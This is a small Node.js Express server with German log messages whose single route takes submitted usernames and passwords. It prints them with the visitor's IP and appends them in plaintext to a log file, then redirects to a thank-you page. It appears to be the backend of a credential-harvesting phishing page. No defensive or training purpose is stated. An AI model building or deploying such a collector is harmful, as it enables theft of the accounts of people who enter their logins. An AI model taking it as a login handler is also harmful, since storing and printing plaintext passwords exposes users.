const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const { username, password } = req.body;

  console.log("🔁 POST /submit wurde aufgerufen");
  console.log("👤 Benutzername:", username);
  console.log("🔑 Passwort:", password);
  console.log("🌐 IP-Adresse:", clientIp);


  const logEntry = {
    timestamp: new Date().toISOString(),
    ip: clientIp,
    userAgent: req.headers['user-agent'],
    username: username,
    password: password
  };

  fs.appendFile('submissions.log', JSON.stringify(logEntry) + '\n', (err) => {
    if (err) console.error("Fehler beim Schreiben der Log-Datei:", err);
  });

  res.redirect('/danke.html');
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
